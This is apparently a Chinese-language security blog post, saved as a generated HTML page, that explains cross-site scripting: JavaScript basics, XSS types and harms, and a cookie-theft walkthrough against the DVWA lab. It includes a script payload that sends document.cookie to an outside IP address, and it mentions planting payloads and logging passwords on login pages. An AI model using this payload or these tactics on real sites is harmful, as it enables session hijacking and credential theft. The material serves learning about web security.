@@ -1,0 +1,1049 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="漏洞简绍跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！ 前端基础js可以在网页上实现任何功">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS">
+<meta property="og:url" content="https://tsy244.github.io/2023/12/01/web/XSS/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="漏洞简绍跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！ 前端基础js可以在网页上实现任何功">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20240501205320595.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/XSS/image-20231201202831226.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234608819.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234837426.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234935086.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207235002011.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208103051827.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207235504418.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208000108029.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208111155822.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208111904181.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231209160210299.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20231209165153379.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204136766.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204249856.png">
+<meta property="article:published_time" content="2023-12-01T12:22:37.000Z">
+<meta property="article:modified_time" content="2024-05-26T02:20:30.915Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20240501205320595.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>XSS - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="XSS"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-01 20:22" pubdate>
+          December 1, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          82 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">XSS</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="漏洞简绍"><a href="#漏洞简绍" class="headerlink" title="漏洞简绍"></a>漏洞简绍</h1><p>跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！</p>
+<h1 id="前端基础"><a href="#前端基础" class="headerlink" title="前端基础"></a>前端基础</h1><h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><p>可以在网页上实现任何功能，让其显示图片，试试更新的内容，交互式的地图，2D&#x2F;3D动画，滚动播放的视频等等</p>
+<h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><p>浏览器的对象模型，JS可以通过BOM访问浏览器的相关信息。对浏览器进行交互。可以修改浏览器的大小啊，高度啥的。</p>
+<p>我的理解是可以把BOM抽象成为一个浏览器的接口看，用于操作浏览器的</p>
+<p>对于攻击者来说可以用于发现漏洞的存在，比如	XSS</p>
+<h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>可以理解为QT的信号和槽函数。我们给某个东西发送一个信号，比如说我们可以给一个按钮点击的事件</p>
+<h3 id="事件处理程序"><a href="#事件处理程序" class="headerlink" title="事件处理程序"></a>事件处理程序</h3><p>这个可以理解为QT的槽函数，用于接受信号，然后作出反应</p>
+<p>针对于某一个事件的就叫做事件处理程序。事件处理程序的开头总是以on开头。比如onclick，onload。如果是模糊事件可以使用onblur</p>
+<p>常见的事件处理程序：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45823118/article/details/116097548">JavaScript学习手册十五：事件处理_javascript学习手册十五:事件处理-CSDN博客</a></p>
+</blockquote>
+<h3 id="JS引用方式"><a href="#JS引用方式" class="headerlink" title="JS引用方式"></a>JS引用方式</h3><h4 id="使用Html标签"><a href="#使用Html标签" class="headerlink" title="使用Html标签"></a>使用Html标签</h4><ol>
+<li><p>使用script</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>脚本块<br>&lt;/script&gt;<br>&lt;!--注意：这里的结束部分：‘&lt;/script&gt;’一定要有--&gt;<br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>直接在元素事件中引用（作为事件的句柄）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">		<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="language-xml">		<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>HTML中嵌入JS代码的第一种方式<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">		<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;window.alert(&#x27;hello zhangsan&#x27;)</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="language-xml">													window.alert(&#x27;hello lis&#x27;)</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="language-xml">													window.alert(&#x27;hello wangwu&#x27;)&quot;</span>/&gt;</span></span><br><span class="language-xml">				</span><br><span class="language-xml">		<span class="hljs-comment">&lt;!-- window. 可以省略。--&gt;</span></span><br><span class="language-xml">		<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;hello zhangsan&#x27;)</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="language-xml">													alert(&#x27;hello lis&#x27;)</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="language-xml">													alert(&#x27;hello wangwu&#x27;)&quot;</span>/&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>外部引用JS</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">		<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="language-xml">		<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>HTML中嵌入JS代码的第三种方式：引入外部独立的js文件<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">		<span class="hljs-comment">&lt;!--这里就导入了js01文件，并运行--&gt;</span></span><br><span class="language-xml">		<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js01.js&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">			<span class="hljs-comment">// 这里写的代码不会执行，执行的是js01文件</span></span></span><br><span class="language-javascript"><span class="language-xml">			<span class="hljs-comment">// window.alert(&quot;Test&quot;);</span></span></span><br><span class="language-javascript"><span class="language-xml">		</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">		</span><br><span class="language-xml">		<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">			<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hello jack!&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">		</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h1><ol>
+<li>没由于针对用户的输入进行过滤</li>
+<li>用户的浏览器执行了恶意的代码</li>
+</ol>
+<h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>主要是对用户造成危害，但是不会基本不会对服务器造成危害</p>
+<ol>
+<li><p>钓鱼欺骗</p>
+<p>制作与正常的服务相类似的网站镜像，然后诱导受害者去点击，输入密码，然后我方进行调用</p>
+<blockquote>
+<p>最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者注入钓鱼 JavaScript 以监控目标网站的表单输入，甚至发起基于 DHTML[^dhtml] 更高级的钓鱼攻击方式。</p>
+</blockquote>
+</li>
+<li><p>网站挂马</p>
+<blockquote>
+<p>跨站时利用 IFrame[^IFrame ] 嵌入隐藏的恶意网站或者将被攻击者定向到恶意网站上，或者弹出恶意网站窗口等方式都可以进行挂马攻击。</p>
+</blockquote>
+<p>可以简单是实现为使用msf 或者cs 的web 攻击，然后添加到网站的根目录或者访问量较大的部分，访问这个页面的时候自动请求payload 使其上线</p>
+</li>
+<li><p>身份盗用</p>
+<p>就是窃取cookie</p>
+<blockquote>
+<p>Cookie 是用户对于特定网站的身份验证标志，XSS 可以盗取到用户的 Cookie，从而利用该 Cookie 盗取用户对该网站的操作权限。如果一个网站管理员用户 Cookie 被窃取，将会对网站引发巨大的危害。</p>
+</blockquote>
+</li>
+<li><p>盗取用户的信息</p>
+<blockquote>
+<p> 当能够窃取到用户 Cookie 从而获取到用户身份使，攻击者可以获取到用户对网站的操作权限，从而查看用户隐私信息。</p>
+</blockquote>
+</li>
+<li><p>垃圾信息发送</p>
+<blockquote>
+<p>比如在 SNS 社区中，利用 XSS 漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p>
+</blockquote>
+</li>
+<li><p>劫持用户的web行为</p>
+<blockquote>
+<p>一些高级的 XSS 攻击甚至可以劫持用户的 Web 行为，监视用户的浏览历史，发送与接收的数据等等。</p>
+</blockquote>
+</li>
+<li><p>XSS蠕虫</p>
+<p>利用csrf 和xss </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/191274.html">技术讨论 | 记一次XSS蠕虫渗透实验 - FreeBuf网络安全行业门户</a></p>
+</blockquote>
+<p>如果发现csrf 可以打组合拳</p>
+</li>
+<li><p>权限维持</p>
+<p>己经获取了web 权限如果发现可以在登陆页面插入xss 代码，然后每一个登陆的时候将会发送请求，从而记录密码</p>
+</li>
+</ol>
+<p>下面是整个的逻辑</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20240501205320595.png" srcset="/img/loading.gif" lazyload alt="image-20240501205320595"></p>
+<h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h2><p>又称为非持久性XSS，这种攻击往往具有一次性</p>
+<p>如果使用，这个需要调用使用社工，钓鱼</p>
+<p>可以使用弹窗发现</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/XSS/image-20231201202831226.png" srcset="/img/loading.gif" lazyload alt="image-20231201202831226"></p>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>又称为持久性XSS，攻击脚本基本储存在咪表的服务器当中，更具有隐蔽性。</p>
+<p>这种多用于博客，论坛，留言板当中，在发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库当中，当用户进行正常的额访问时，触发XSS代码</p>
+<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>可以理解为不经过后端只在前端执行的代码</p>
+<h1 id="盗用cookie"><a href="#盗用cookie" class="headerlink" title="盗用cookie"></a>盗用cookie</h1><h2 id="cookile简绍"><a href="#cookile简绍" class="headerlink" title="cookile简绍"></a>cookile简绍</h2><p>Cookie是HTTP协议下，服务器可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户的客户端上的小文本文件，它可以包含多种信息</p>
+<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ol>
+<li><p>没有httponly</p>
+</li>
+<li><p>受害者可以直接访问到接收端</p>
+</li>
+<li><p>获取cookie之后目标用户没有退出</p>
+<p>这里如果用户有退出登录了，会话就消失了，也就是说cookie在这里就直接失效了</p>
+</li>
+</ol>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>我们分两个视角来发现，这个过程基于dvwa靶场</p>
+<p><strong>攻击者：</strong></p>
+<p>首先我访问正常的网页内容，然后发现了存在XSS漏洞，我作为攻击者我的目的是获取登录者的cookie然后登录他</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234608819.png" srcset="/img/loading.gif" lazyload alt="image-20231207234608819"></p>
+<p>我先尝试使用弹窗看是否存在xss</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234837426.png" srcset="/img/loading.gif" lazyload alt="image-20231207234837426"></p>
+<p>发现不能输入了，这个时候我们修改这个框框的长度</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234935086.png" srcset="/img/loading.gif" lazyload alt="image-20231207234935086"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207235002011.png" srcset="/img/loading.gif" lazyload alt="image-20231207235002011"></p>
+<p>下面是我使用另一个浏览器浏览的结果(这里模仿的是其他用户访问带有脚本的网页)</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208103051827.png" srcset="/img/loading.gif" lazyload alt="image-20231208103051827"></p>
+<p>存在漏洞，那就直接搞</p>
+<p>有多种方式搭建xss平台</p>
+<p><strong>方式一：</strong></p>
+<p>尝试使用云服务器开启python的http服务</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207235504418.png" srcset="/img/loading.gif" lazyload alt="image-20231207235504418"></p>
+<p>然后构建下面的payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://8.130.123.25:11234/?q=&#x27;</span>.<span class="hljs-title function_">btoa</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>))</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208000108029.png" srcset="/img/loading.gif" lazyload alt="image-20231208000108029"></p>
+<p>现在看我们的服务器是否发cookie</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208111155822.png" srcset="/img/loading.gif" lazyload alt="image-20231208111155822"></p>
+<p>本机上面测试的，下面是使用服务器，获取使用者的cookie</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208111904181.png" srcset="/img/loading.gif" lazyload alt="image-20231208111904181"></p>
+<p>也是成功获取，这个主要的方式是，启动一个我们伪造的网页或者web服务，使用他的cookie作为参数，传给我们，然后我们使用它的cookie就可以登录他的账号了</p>
+<p>我们也可以搭建自己xss平台</p>
+<p>但是上面的方法始终不会很隐蔽</p>
+<h1 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h1><p>就是诱骗你去点链接</p>
+<h2 id="Flash-钓鱼"><a href="#Flash-钓鱼" class="headerlink" title="Flash 钓鱼"></a>Flash 钓鱼</h2><p>就是除了网站url，但是其他的都相同</p>
